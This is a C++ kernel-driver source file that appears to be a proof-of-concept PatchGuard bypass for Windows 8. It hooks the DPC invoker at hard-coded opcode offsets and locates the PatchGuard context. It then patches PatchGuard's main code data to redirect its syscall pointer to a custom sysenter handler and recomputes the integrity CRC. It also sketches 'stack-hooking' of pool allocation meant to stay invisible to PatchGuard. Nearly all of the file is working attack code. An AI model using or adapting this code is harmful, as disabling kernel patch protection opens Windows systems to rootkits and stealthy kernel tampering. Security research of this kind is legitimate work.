/**
 * @file PatchGuardBoost.cpp
 * @author created by: Peter Hlavaty
 */

#include "StdAfx.h"
#include "PatchGuardBoost.h"
#include "../Common/Common.h"
#include "../PatchGuard/PatchGuard.h"

EXTERN_C void dpcinvhook();
EXTERN_C void alloccheck();

BYTE CPatchGuardBoost::m_dpcHookMem[sizeof(CColdPatcher)];

CPatchGuardBoost::CPatchGuardBoost() : COneLoopDPC(2000)
{
	m_syscall.Install();
	RtlZeroMemory(m_dpcHookMem, sizeof(m_dpcHookMem));
}

//not correct destruction, due to patched PatchGuard Context ...
CPatchGuardBoost::~CPatchGuardBoost()
{
	//necessary before m_syscall also repatch PatchGuard ;)
	//just install at EP of PatchGuard main hook
	//and in destructor wait for callback an re-patch ;) !

	if (m_dpcHookMem)//CColdPatcher initialized ?
		CPatchGuardBoost::DpcHook()->~CColdPatcher();
}

void CPatchGuardBoost::Boost()
{
	KeepTimerInLoop();
}

void CPatchGuardBoost::CustomDPC( 
	__in struct _KDPC* Dpc, 
	__in void* DeferredContext, 
	__in_opt void* SystemArgument1, 
	__in_opt void* SystemArgument2 
	)
{
	ULONG_PTR delay_execution = *((ULONG_PTR*)&Dpc + 8) - 3 - 4 - 5 - 5;//some magic constants of opcode related to win8 :P
	::new(m_dpcHookMem) CColdPatcher((void*)delay_execution, dpcinvhook);

	//also another place where to need to hook for proper implementation :
	//{ 
	//  KeWaitForMutexObject for nt!KiDispatchCallout, -> fot this is necessary to implement another (also easy method) obtainig PGCTX!
	//  KeSetCoalescableTimer with DueTime.QuadPart == 0; -> in Boos() -> ResetTimer(0, 1000, 0, false)
	//  other ?
	//}
	
	DbgPrint("\nDelayExecution %p hook set!\n", delay_execution);
	KeBreak();
/*
//if intervaltimer ...
	CPatchGuardBoost* pg = (CPatchGuardBoost*)DeferredContext;
	pg->StopTimer();
*/
}

EXTERN_C void sysenter();

//we should be also lucky enough to patchguard thread will go trough this hooked-place 
//&& other patchguard thread not detect our hook already.. 
//if not then just try one more time .. :P .. just PoC, and after few try'ies you hit expected behaviour ;)
EXTERN_C void DPCInvokerHook( 
	__in struct _KDPC* Dpc, 
	__in void* DeferredContext, 
	__in_opt void* SystemArgument1, 
	__in_opt void* SystemArgument2 
	)
{
	if (!DeferredContext)
		return;
	
	//just info callback for stealhiness of patchguard thread ...
	if (0xfffff00000000000 != ((ULONG_PTR)DeferredContext & 0xFFFFF00000000000))
		DbgPrint("\nDereferred ctx %p <%p (+what was previous rutine ?)> %p %p %p\n", DeferredContext, Dpc->DeferredRoutine, Dpc, SystemArgument1, SystemArgument2);
	
	if (CPageGuard::IsPatchGuardContext(Dpc))
	{
		//no need for checking for NULL! cause this DPCInvokerHook will be not called if it is NULL ;) 
		CPatchGuardBoost::DpcHook()->ReHook();

		CPageGuard pg(Dpc);
		PAGEGUARD_STRUCT* pgs = pg.GetStruct();
		DbgPrint("\n\n??? %x %p %x %x %x %p !!!\n\n", pgs->SizeOfCodeInPtr, pgs->CRC, pgs->SizeOfDataBlock, pgs->MainCodeRVA, pgs->RolByteInUlong, pgs->XorKey);
						
		void* syscall = sysenter;//CSysCall::GetSysCall(0);//by default just one core cpu :P
		pg.PatchData(pgs->MainCodeRVA + PG_SYSCALL_OFF, &syscall, sizeof(syscall));
		
/*		
		//callback per patchguard exec ;) .. but not discovered yet, if no other checksum checked, when code patched, etc.
		BYTE bp = 0xCC;
		pgs->MainCodeRVA--;//in dtor of CPageGuard, this will be patched in PGCTX ...
		pg.PatchData(pgs->MainCodeRVA, &bp, sizeof(bp));
*/		

		DbgPrint("\n\npatched, and new CRC : %p !!!\n\n", pg.CalculateIntegrityHash());
		KeBreak();

		//but another thread of patch guard can detect this patch ... 
		//TODO is to implement patches to all pageguard threads ...
	}
}

EXTERN_C void ExAllocCheck(
	__in  POOL_TYPE PoolType,
	__in  SIZE_T NumberOfBytes,
	__in  ULONG Tag
	)
{
	//AllocHook()->ReHook(); //-> hide - unpatch hook, but still hooked due tempering stack-ret to ExAllocFinal  : stack-hooking
	DbgPrint("\nExAllocCheck : %p %x %x %x\n", *((ULONG_PTR*)&PoolType + 0x1a), PoolType, NumberOfBytes, Tag);
}

//stack-hooking ... invisible to patchguard but need support from classic hooking :P - or just made some research about it ...
EXTERN_C void ExAllocFinal(
	__in void* pool
	)
{
	//AllocHook()->ReHook(); //hook back ExAlloc ... 
	DbgPrint("\nExAllocFinal : %p [%p]\n", pool, *((ULONG_PTR*)&pool + 0x19));
}
